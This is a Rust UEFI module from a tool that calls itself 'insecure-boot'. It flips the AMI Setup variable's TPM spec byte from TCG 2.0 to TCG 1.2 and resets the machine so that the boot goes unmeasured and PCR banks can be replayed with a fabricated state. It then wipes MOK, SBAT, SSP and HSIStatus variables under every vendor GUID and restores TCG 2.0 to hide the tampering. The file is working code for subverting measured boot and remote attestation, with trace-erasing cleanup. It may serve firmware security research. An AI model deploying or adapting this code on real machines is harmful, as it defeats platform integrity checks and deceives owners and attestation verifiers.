//! The firmware variables the boot reads, flips, and leaves behind.
//!
//! Everything here lives in NVRAM, so it survives the boots that touch it.
//! The firmware's `Setup` variable holds the TPM UEFI spec version at the
//! byte offset the staged configuration names: a genuine boot keeps it at
//! TCG 2.0 and measures every stage into the SHA-256 banks, while this boot
//! needs TCG 1.2, because the banks it replays into have to reach the TPM
//! empty. If the byte still says TCG 2.0, the firmware has been measuring
//! this very boot, so it is flipped to TCG 1.2 and the machine is reset with
//! every staged artifact left in place, and the boot starts over.
//!
//! The same store holds what the enrollment and the shim left behind: the
//! Mok* variables under the shim vendor GUID, and any survivor under any
//! other. Before the payload runs, every one of them is deleted and the spec
//! version byte is put back to TCG 2.0, so the machine is genuinely
//! configured again by the time the next boot measures it.

use alloc::boxed::Box;
use core::time::Duration;

use uefi::boot;
use uefi::cstr16;
use uefi::guid;
use uefi::println;
use uefi::runtime::{self, ResetType, VariableAttributes, VariableVendor};
use uefi::{CStr16, Status};

use crate::error::{Error, Result};

/// Shim vendor GUID (`Mok*`, `Sbat*`, `HSIStatus`, ...).
const SHIM_LOCK: VariableVendor = VariableVendor(guid!("605dab50-e046-4670-8a0c-6f9aba2d42d7"));

/// Default AMI Aptio "Setup" variable GUID.
const AMI_SETUP: VariableVendor = VariableVendor(guid!("ec87d643-eba4-4bb5-a1e5-3f3e36b20da9"));

/// The variable the firmware keeps its settings page in.
const SETUP_NAME: &CStr16 = cstr16!("Setup");

/// The byte the TPM UEFI spec version setting holds for TCG 1.2.
const TCG_1_2: u8 = 1;

/// The byte the TPM UEFI spec version setting holds for TCG 2.0.
const TCG_2_0: u8 = 2;

/// Every variable name this module deletes, wherever it lives.
const KILL_LIST: &[&CStr16] = &[
    cstr16!("MokList"),
    cstr16!("MokListRT"),
    cstr16!("MokListX"),
    cstr16!("MokListXRT"),
    cstr16!("MokSBState"),
    cstr16!("MokSBStateRT"),
    cstr16!("MokDBState"),
    cstr16!("MokIgnoreDB"),
    cstr16!("MokPWStore"),
    cstr16!("MokListTrusted"),
    cstr16!("MokListTrustedRT"),
    cstr16!("HSIStatus"),
    cstr16!("SbatLevel"),
    cstr16!("SbatLevelRT"),
    cstr16!("SbatPolicy"),
    cstr16!("SSPPolicy"),
];

/// Brings the TPM UEFI spec version down to TCG 1.2, at the byte offset the
/// staged configuration names.
///
/// A byte already at TCG 1.2 passes through untouched. A byte at TCG 2.0
/// means the firmware has been measuring this very boot into the SHA-256
/// banks, so the replay could not reproduce a genuine state on top of them:
/// the byte is flipped to TCG 1.2 and the machine is reset, with every
/// staged artifact left in place for the boot that tries again. That path
/// never returns.
///
/// # Errors
///
/// Fails if `Setup` cannot be read or written, is too small for the
/// configured offset, or holds a value that is neither TCG 1.2 nor TCG 2.0.
pub fn ensure_tcg_1_2(offset: usize) -> Result<()> {
    let (mut data, attributes) = setup()?;

    if data.len() <= offset {
        return Err(Error::SetupTooSmall {
            len: data.len(),
            offset,
        });
    }

    let byte = &mut data[offset];

    match *byte {
        TCG_1_2 => {
            println!("insecure-boot: TCG UEFI spec version is already TCG 1.2");
            Ok(())
        }
        TCG_2_0 => {
            *byte = TCG_1_2;
            runtime::set_variable(SETUP_NAME, &AMI_SETUP, attributes, &data)
                .map_err(|error| Error::ProtectedVariables(error.status()))?;

            println!("insecure-boot: TCG UEFI spec version was TCG 2.0, now TCG 1.2");
            println!("insecure-boot: resetting, every staged file stays for the next boot");
            runtime::reset(ResetType::COLD, Status::SUCCESS, None);
        }
        other => Err(Error::UnexpectedTcgSpec(other)),
    }
}

/// Deletes every shim/MOK/SBAT/SSP variable the enrollment and the shim left
/// behind, then puts the TPM UEFI spec version back to TCG 2.0 for the boots
/// after this one.
///
/// Deletion failures and `Setup` failures are printed and otherwise ignored:
/// the boot continues either way, and a survivor is reported loudly enough
/// on the console.
pub fn clear_residue(offset: usize) {
    // Nothing here takes minutes, but there is no reason to risk the
    // five-minute watchdog firing in the middle of the wipe.
    let _ = boot::set_watchdog_timer(0, 0, None);

    println!();
    println!("insecure-boot: wiping MOK/SBAT/SSP variables");
    println!();

    for name in KILL_LIST {
        match wipe(name, &SHIM_LOCK) {
            Outcome::Deleted => println!("  {name}: deleted"),
            Outcome::NotPresent => println!("  {name}: not present"),
            Outcome::Failed(status) => println!("  {name}: FAILED ({status:?})"),
        }
    }

    sweep();

    println!();
    println!("insecure-boot: AMI Setup:");
    restore_tcg_2(offset);

    println!();
    println!("insecure-boot: Variables cleared");

    for _ in 0..5 {
        boot::stall(Duration::from_secs(1));
    }
}

/// Reads the `Setup` variable whole, with the attributes it was written
/// with, so a write-back can put both back exactly.
///
/// # Errors
///
/// Fails with [`Error::NoSetupVariable`] when the firmware keeps no such
/// variable, and with the raw failure otherwise.
fn setup() -> Result<(Box<[u8]>, VariableAttributes)> {
    match runtime::get_variable_boxed(SETUP_NAME, &AMI_SETUP) {
        Ok(read) => Ok(read),
        Err(error) if error.status() == Status::NOT_FOUND => Err(Error::NoSetupVariable),
        Err(error) => Err(Error::Uefi(error)),
    }
}

/// Puts the TCG UEFI spec version byte back to TCG 2.0, leaving every other
/// byte of `Setup` and its attributes alone.
fn restore_tcg_2(offset: usize) {
    let (mut data, attributes) = match setup() {
        Ok(setup) => setup,
        Err(error) => {
            println!("insecure-boot: Setup read failed: {error} (no AMI Setup variable?)");
            return;
        }
    };

    let Some(byte) = data.get_mut(offset) else {
        println!(
            "insecure-boot: Setup: too small ({} bytes) for offset {offset:#x}",
            data.len()
        );
        return;
    };

    if *byte == TCG_2_0 {
        println!("insecure-boot: Setup[{offset:#x}] already {TCG_2_0}");
        return;
    }

    let old = *byte;
    *byte = TCG_2_0;

    match runtime::set_variable(SETUP_NAME, &AMI_SETUP, attributes, &data) {
        Ok(()) => println!(
            "insecure-boot: Setup[{offset:#x}]: {old} -> {TCG_2_0} ({} bytes, {attributes:?})",
            data.len()
        ),
        Err(error) => println!("insecure-boot: Setup write FAILED: {:?}", error.status()),
    }
}

/// What deleting one variable came to.
enum Outcome {
    Deleted,
    NotPresent,
    Failed(Status),
}

/// Deletes `name` under `vendor`, trying the variable's real attributes
/// first and common attribute guesses after: some firmwares check the
/// attribute mask on deletion, some do not.
fn wipe(name: &CStr16, vendor: &VariableVendor) -> Outcome {
    let read_attributes = match runtime::get_variable_boxed(name, vendor) {
        Ok((_, attributes)) => Some(attributes),
        Err(error) if error.status() == Status::NOT_FOUND => return Outcome::NotPresent,
        // BUFFER_TOO_SMALL, SECURITY_VIOLATION, and anything else: fall
        // through and try deleting with guessed attributes anyway.
        Err(_) => None,
    };

    let nv_bs = VariableAttributes::NON_VOLATILE | VariableAttributes::BOOTSERVICE_ACCESS;
    let nv_bs_rt = nv_bs | VariableAttributes::RUNTIME_ACCESS;

    let mut candidates = [VariableAttributes::empty(); 4];
    let mut count = 0;
    if let Some(attributes) = read_attributes {
        candidates[count] = attributes;
        count += 1;
    }
    candidates[count] = nv_bs_rt;
    count += 1;
    candidates[count] = nv_bs;
    count += 1;
    candidates[count] = VariableAttributes::empty();
    count += 1;

    let mut last = Status::NOT_FOUND;
    for candidate in &candidates[..count] {
        match runtime::set_variable(name, vendor, *candidate, &[]) {
            Ok(()) => return Outcome::Deleted,
            Err(error) => last = error.status(),
        }
    }
    Outcome::Failed(last)
}

/// Walks the whole variable store and deletes every kill-list name under any
/// vendor GUID. The walk restarts after every deletion: deleting the
/// variable the enumeration cursor points at is unreliable.
fn sweep() {
    loop {
        let mut deleted = false;

        for key in runtime::variable_keys() {
            let key = match key {
                Ok(key) => key,
                Err(error) => {
                    println!("[sweep] enumeration error: {:?}", error.status());
                    return;
                }
            };

            if !KILL_LIST.iter().any(|kill| key.name == *kill) {
                continue;
            }

            match wipe(&key.name, &key.vendor) {
                Outcome::Deleted => {
                    println!("[sweep] deleted {} @ {:?}", key.name, key.vendor.0);
                }
                Outcome::NotPresent => {
                    println!("[sweep] {} vanished @ {:?}", key.name, key.vendor.0);
                }
                Outcome::Failed(status) => println!(
                    "[sweep] FAILED {} @ {:?}: {:?}",
                    key.name, key.vendor.0, status
                ),
            }

            deleted = true;
            break;
        }

        if !deleted {
            return;
        }
    }
}
